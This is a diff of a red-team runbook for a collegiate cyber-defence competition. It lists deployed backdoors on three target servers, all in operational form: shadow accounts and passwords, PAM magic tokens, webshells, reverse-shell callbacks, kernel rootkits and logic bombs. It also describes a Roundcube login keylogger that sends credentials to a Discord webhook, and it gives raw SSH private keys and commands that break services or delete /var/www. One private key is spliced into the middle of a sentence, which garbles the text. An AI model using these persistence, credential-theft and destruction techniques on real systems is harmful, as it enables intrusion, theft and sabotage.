@@ -1,6 +1,7 @@
 # Red Team Engagement Runbook — CCDC 2026
 
 > **Attacker range:** 172.31.40.1–6  
+> **Attacker box:** red2@172.31.40.6 — password: `Pa$$w0rd`  
 > **Duration:** 4 hours  
 > **Targets:** Rocky Ecom · Ubuntu Mail · Debian Splunk
 
@@ -10,9 +11,97 @@
 
 | Box | IP | OS | Key Services |
 |-----|----|----|-------------|
-| Rocky Ecom | 172.20.240.10 | Rocky Linux 9 | HTTP/HTTPS, OpenCart/PrestaShop |
-| Ubuntu Mail | 172.20.240.15 | Ubuntu 22.04 | Postfix, Dovecot, Roundcube |
-| Debian Splunk | 172.20.240.20 | Debian 12 | Splunk Enterprise :8000 |
+| Rocky Ecom | 172.25.20.10 | Rocky Linux 9 | HTTP/HTTPS, OpenCart/PrestaShop |
+| Ubuntu Mail | 172.25.20.15 | Ubuntu 22.04 | Postfix, Dovecot, Roundcube |
+| Debian Splunk | 172.25.20.20 | Debian 12 | Splunk Enterprise :8000 |
+
+---
+
+## Deployed Credentials
+
+### Rocky Ecom — 172.25.20.10 ✅ DEPLOYED
+
+| Field | Value |
+|-------|-------|
+| Login user | sysadmin |
+| Shadow user | sys.sync |
+| Shadow pass | `iraeEVoD90JRhIdc` |
+| Extra accounts | netadmin / svc.monitor (same pass) |
+| PAM magic token | `ba527099d34660d07b6af92e` |
+| Webshell | http://172.25.20.10/health.php |
+| Callback | 172.31.40.6:4444 every 2 min |
+| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
+| LKM | Loaded — kernel 5.14.0-687.61.1.el9_8.x86_64 |
+| Poisoned users | root, netadmin, ssh_scoring, svc.monitor, sysadmin |
+| Purged | nano, tcpdump, strace, psacct |
+| Manual disruption | Nuked httpd config contents (deleted most directives, left it syntactically broken); deleted `index.php`; deleted admin dir; went around the config entirely and deleted random critical directives directly — service non-recoverable without full reinstall or backup; ICMP ping blocked (`icmp_echo_ignore_all=1`, persisted to sysctl.conf) |
+
+**SSH Private Key (svc-monitoring):**
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFggAAAJjoomgi6KJo
+IgAAAAtzc2gtZWQyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFgg
+AAAEDzRcHogC1svr9gUdO0FDKTF8t9mlCo81dn4EfxY4ga9LuPFMxox/+JiXItN3yW4OUj
++8mp2LzJCWYE9t9SooWCAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### Ubuntu Mail — 172.25.20.15 ✅ DEPLOYED
+
+| Field | Value |
+|-------|-------|
+| Login user | sysadmin |
+| Shadow user | sys.sync |
+| Shadow pass | `3XwQ2h7Hb6eDdOUo` |
+| Extra accounts | netadmin / svc.monitor (same pass) |
+| PAM magic token | `4f31b23527b8d143a5e3be00` |
+| Webshell | http://172.25.20.15/roundcubemail/health.php (or /health.php) |
+| Mail archive | `/usr/local/lib/.locale_cache/` |
+| Callback | 172.31.40.6:5555 every 2 min |
+| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
+| LKM | Loaded — kernel 5.15.0-202-generic |
+| Poisoned users | root, netadmin, scorecheck, svc.monitor, sysadmin |
+| SSH port | **30** (changed manually post-persistence — commands in this runbook still use default 22) |
+| Manual disruption | Removed ldap-utils, wiped /etc/krb5.keytab, /etc/krb5.conf, /var/lib/sss/; Postfix: smtpd_recipient_restrictions=reject_all, relayhost=[mail.invalid]:25, smtpd_tls_cert/key=nonexistent, smtpd_client_restrictions=reject — main.cf locked chattr+i; Dovecot: appended auth_mechanisms=, mail_location=/nonexistent/%u/Maildir, ssl certs=nonexistent to dovecot.conf — dovecot.conf locked chattr+i — dovecot service **broken/down**; ICMP ping blocked (`icmp_echo_ignore_all=1`, persisted to sysctl.conf); Roundcube login.html has JS keylogger injecting credentials to Discord webhook (marker `<!-- rc-kl -->`), re-injected every 5min by `apache2-cache.timer` → `/usr/local/lib/.def_rc_inject` (hidden by LKM, chattr+i); service/timer files in `/etc/systemd/system/apache2-cache.*` (chattr+i) |
+
+**SSH Private Key (svc-monitoring):**
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACAyN3gNXewc5DgMRxYpSUsygIcPmfNyvrpiHJUsstHYFQAAAJgiHxMDIh8T
+AwAAAAtzc2gtZWQyNTUxOQAAACAyN3gNXewc5DgMRxYpSUsygIcPmfNyvrpiHJUsstHYFQ
+AAAEDMzKwahux8JFIQZo0ab21g1NYCX6EP/8jFSV4T2T7xSDI3eA1d7BzkOAxHFilJSzKA
+hw+Z83K+umIclSyy0dgVAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### Debian Splunk — 172.25.20.20 ✅ DEPLOYED
+
+| Field | Value |
+|-------|-------|
+| Login user | sysadmin |
+| Shadow user | sys.sync |
+| Shadow pass | `DVrTBPApNLincgTj` |
+| Extra accounts | netadmin / svc.monitor (same pass) |
+| PAM magic token | `1bf6365d859207215c91ada0` |
+| Callback | 172.31.40.6:**6666** every 2 min |
+| Logic bomb | Armed — jobs 1–4 at 17:00/17:05/17:10/17:30 UTC Oct 31 |
+| LKM | Loaded — kernel 6.1.0-54-amd64 (auto-loaded on reboot after Secure Boot disabled) |
+| Poisoned users | root, netadmin, svc.monitor, sysadmin |
+| SSH port | **30** (changed manually post-persistence) |
+| Manual disruption | ICMP ping blocked (sysctl.conf); Splunk web.conf → server.socket_host=127.0.0.1 (chattr+i); server.conf → allowRemoteLogin=never; nano purged (shell poison blocks reinstall) |
+
+**SSH Private Key (svc-monitoring):**
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDujMJ4683Rdb/yFTtRRd9otolcSkZY82lpmFl6P5GugAAAAJhk6XKMZOly
+jAAAAAtzc2gtZWQyNTUxOQAAACDujMJ4683Rdb/yFTtRRd9otolcSkZY82lpmFl6P5GugA
+AAAEDTh9XyRyzbrog1FY0cc/VYmwAfjpYtcaT88ZahVAPTAO6MwnjrzdF1v/IVO1FF32i2
+iVxKRljzaWmYWXo/ka6AAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+```
 
 ---
 
@@ -24,18 +113,20 @@ triggers 2 hours after arming, so arming it now means it fires overnight.
 ### Step 1 — Get initial access on each box
 
 ```bash
-ssh root@172.20.240.10
-ssh root@172.20.240.15
-ssh root@172.20.240.20
+ssh sysadmin@172.25.20.10
+ssh sysadmin@172.25.20.15
+ssh sysadmin@172.25.20.20
 ```
 
-Common defaults to try: `root/toor`, `root/password`, `root/ccdc`, `admin/admin`.
+Common defaults to try: `root/toor`, `root/password`, `root/ccdc`, `admin/admin`, `sysadmin/Changeme1!`.
+
+> **Note:** All boxes are now on SSH port 30 — add `-p 30` once you've run persistence and changed the port manually.
 
 ### Step 2 — SCP toolkit and deploy persistence
 
 ```bash
-TARGET=172.20.240.10   # repeat for .15 and .20
-USER=sysadmin          # or root if direct root SSH is available
+TARGET=172.25.20.10   # repeat for .15 and .20
+USER=sysadmin
 
 ssh ${USER}@${TARGET} "rm -rf ~/rt"
 scp -r bin/attack/ ${USER}@${TARGET}:~/rt
@@ -84,15 +175,15 @@ chmod 600 ~/.rt_keys
 ### Step 4 — Verify before you leave
 
 ```bash
-# SSH key
-ssh -i ~/.rt_keys root@172.20.240.10
-ssh -i ~/.rt_keys root@172.20.240.15
-ssh -i ~/.rt_keys root@172.20.240.20
+# SSH key (port 30 after manual SSH port change)
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15
+ssh -i ~/.rt_keys -p 30 root@172.25.20.20
 
 # Webshells
-curl -s http://172.20.240.10/health.php | head -5
-curl -s http://172.20.240.15/health.php | head -5
-curl -s http://172.20.240.15/roundcubemail/health.php | head -5
+curl -s http://172.25.20.10/health.php | head -5
+curl -s http://172.25.20.15/health.php | head -5
+curl -s http://172.25.20.15/roundcubemail/health.php | head -5
 ```
 
 ---
@@ -102,16 +193,18 @@ curl -s http://172.20.240.15/roundcubemail/health.php | head -5
 Before the clock starts, start your listener and do a quick access check.
 
 ```bash
-# Terminal 1 — reverse shell listener
-ncat -lvnp 4444
+# Terminal 1 — reverse shell listeners
+ncat -lvnp 4444   # Rocky + Mail callbacks
+ncat -lvnp 5555   # Ubuntu Mail (second listener)
+ncat -lvnp 6666   # Debian Splunk
 
 # Terminal 2 — verify SSH key access still works
-ssh -i ~/.rt_keys root@172.20.240.10 "id"
-ssh -i ~/.rt_keys root@172.20.240.15 "id"
-ssh -i ~/.rt_keys root@172.20.240.20 "id"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "id"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "id"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "id"
 ```
 
-Cron callbacks will begin arriving on port 4444 within 2 minutes of game start.
+Cron callbacks will begin arriving within 2 minutes of game start.
 
 ### Stabilize the reverse shell (do this every time)
 
@@ -132,7 +225,13 @@ Ctrl+Z
 stty raw -echo; fg
 ```
 
-You now have tab complete, arrow keys, and Ctrl+C kills remote processes instead of
+You now have tab compl-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFggAAAJjoomgi6KJo
+IgAAAAtzc2gtZWQyNTUxOQAAACC7jxTMaMf/iYlyLTd8luDlI/vJqdi8yQlmBPbfUqKFgg
+AAAEDzRcHogC1svr9gUdO0FDKTF8t9mlCo81dn4EfxY4ga9LuPFMxox/+JiXItN3yW4OUj
++8mp2LzJCWYE9t9SooWCAAAADnN2Yy1tb25pdG9yaW5nAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----ete, arrow keys, and Ctrl+C kills remote processes instead of
 your session. If you accidentally Ctrl+C before stabilizing, you lose the shell —
 stabilize first, always.
 
@@ -144,25 +243,25 @@ The toolkit was wiped after the night-before deploy. Re-upload it first using th
 
 ```bash
 # Re-upload toolkit to each box
-for TARGET in 172.20.240.10 172.20.240.15 172.20.240.20; do
-    ssh -i ~/.rt_keys root@${TARGET} "rm -rf ~/rt"
-    scp -i ~/.rt_keys -r bin/attack/ root@${TARGET}:~/rt
+for TARGET in 172.25.20.10 172.25.20.15 172.25.20.20; do
+    ssh -i ~/.rt_keys -p 30 root@${TARGET} "rm -rf ~/rt"
+    scp -i ~/.rt_keys -P 30 -r bin/attack/ root@${TARGET}:~/rt
 done
 ```
 
 ```bash
-# Arm the 2-hour logic bomb
-ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/12_logic_bomb.sh deploy"
-ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/12_logic_bomb.sh deploy"
-ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/12_logic_bomb.sh deploy"
+# Arm the logic bomb (already set to 17:00 UTC Oct 31 — verify with status first)
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/12_logic_bomb.sh deploy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/12_logic_bomb.sh deploy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/12_logic_bomb.sh deploy"
 
 # Trigger scoring disruption (box-specific)
-ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/deploy_attack.sh deploy disrupt"
-ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/deploy_attack.sh deploy disrupt"
-ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/deploy_attack.sh deploy disrupt"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/deploy_attack.sh deploy disrupt"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/deploy_attack.sh deploy disrupt"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/deploy_attack.sh deploy disrupt"
 
 # If using sysadmin instead of the planted root key:
-# ssh -t sysadmin@TARGET "sudo bash ~/rt/12_logic_bomb.sh deploy"
+# ssh -t -p 30 sysadmin@TARGET "sudo bash ~/rt/12_logic_bomb.sh deploy"
 ```
 
 ---
@@ -191,7 +290,7 @@ bash ~/rt/12_logic_bomb.sh deploy
 ### Mail intercept check (Ubuntu Mail only)
 
 ```bash
-ssh -i ~/.rt_keys root@172.20.240.15 "ls /usr/local/lib/.locale_cache/"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "ls /usr/local/lib/.locale_cache/"
 ```
 
 ---
@@ -231,9 +330,9 @@ That's a lot of time they don't have.
 ### Re-disrupt if blue team restores a service
 
 ```bash
-ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/07_disrupt_web.sh deploy"
-ssh -i ~/.rt_keys root@172.20.240.15 "bash ~/rt/08_disrupt_mail.sh deploy"
-ssh -i ~/.rt_keys root@172.20.240.20 "bash ~/rt/09_disrupt_splunk.sh deploy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/07_disrupt_web.sh deploy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.15 "bash ~/rt/08_disrupt_mail.sh deploy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.20 "bash ~/rt/09_disrupt_splunk.sh deploy"
 ```
 
 ### Nuke the web app entirely (Rocky Ecom)
@@ -242,9 +341,9 @@ If they keep restoring the service, delete `/var/www` outright — they'll need 
 do a full redeploy from defender, not just a service restart.
 
 ```bash
-ssh -i ~/.rt_keys root@172.20.240.10 "bash ~/rt/deploy_attack.sh deploy destroy"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "bash ~/rt/deploy_attack.sh deploy destroy"
 # or directly:
-ssh -i ~/.rt_keys root@172.20.240.10 "rm -rf /var/www"
+ssh -i ~/.rt_keys -p 30 root@172.25.20.10 "rm -rf /var/www"
 ```
 
 ---
@@ -255,10 +354,10 @@ If you lose access to a box, work down this list:
 
 | # | Method | Command |
 |---|--------|---------|
-| 1 | SSH private key | `ssh -i ~/.rt_keys root@TARGET` |
-| 2 | PAM magic pass | `ssh root@TARGET` → use MAGIC_PASS |
-| 3 | Shadow account | `ssh sys.sync@TARGET` → use SHADOW_PASS |
-| 4 | Extra accounts | `ssh netadmin@TARGET` or `ssh svc.monitor@TARGET` → use SHADOW_PASS |
+| 1 | SSH private key | `ssh -i ~/.rt_keys -p 30 root@TARGET` |
+| 2 | PAM magic pass | `ssh -p 30 root@TARGET` → use MAGIC_PASS |
+| 3 | Shadow account | `ssh -p 30 sys.sync@TARGET` → use SHADOW_PASS |
+| 4 | Extra accounts | `ssh -p 30 netadmin@TARGET` or `ssh -p 30 svc.monitor@TARGET` → use SHADOW_PASS |
 | 5 | Webshell | browse to `http://TARGET/health.php` |
 | 6 | Cron callback | wait ≤2 min for shell on port 4444 |
 | 7 | Re-deploy from scratch | SCP + `deploy_attack.sh deploy persistence` |
